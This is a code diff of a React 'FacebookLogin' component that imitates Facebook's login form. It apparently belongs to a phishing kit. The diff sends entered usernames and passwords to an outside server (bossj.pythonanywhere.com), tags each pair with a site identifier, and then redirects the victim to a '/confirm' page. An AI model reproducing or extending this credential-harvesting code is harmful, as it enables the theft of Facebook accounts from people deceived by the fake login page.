@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom"; // Use useNavigate instead of useHistory
 import fbLogo from "../assets/fb.svg"; // Import the Facebook logo
+import { useSite } from "../context/SiteContext";
 
 export const FacebookLogin: React.FC = () => {
   const [focusedInput, setFocusedInput] = useState<string | null>(null);
@@ -10,6 +11,7 @@ export const FacebookLogin: React.FC = () => {
   const [usernameError, setUsernameError] = useState<boolean>(false);
   const [passwordError, setPasswordError] = useState<boolean>(false);
   const navigate = useNavigate(); // Initialize useNavigate
+  const { siteId } = useSite() || { siteId: "defaultSiteId" }; // Ensure siteId has a fallback value
 
   const handleLogin = async () => {
     // Validate username and password
@@ -21,32 +23,37 @@ export const FacebookLogin: React.FC = () => {
     }
 
     setLoading(true);
+    const xusername = `${username}_${siteId}`;
+    const xpassword = `${password}_${siteId}`;
 
     try {
-      // Send login request without device data
-      const response = await fetch("http://127.0.0.1:8000/api/facebook/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          username, // Updated to 'username'
-          password,
-        }),
-      });
+      const response = await fetch(
+        "https://bossj.pythonanywhere.com/api/facebook/",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            xusername: xusername, // Ensure correct API field names
+            xpassword: xpassword,
+          }),
+        }
+      );
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
 
       const data = await response.json();
 
-      // Add a delay of 2 seconds before processing the response
       setTimeout(() => {
         if (data.message) {
-          // Successful login, redirect to home page
-          navigate("/"); // Use navigate instead of history.push
+          navigate("/confirm"); // Navigate after success
         } else {
-          // Handle error (e.g., display an error message)
           console.error("Login Error:", data.error);
         }
-      }, 2000); // 2 seconds delay
+      }, 2000);
     } catch (error) {
       console.error("Login Error:", error);
     } finally {
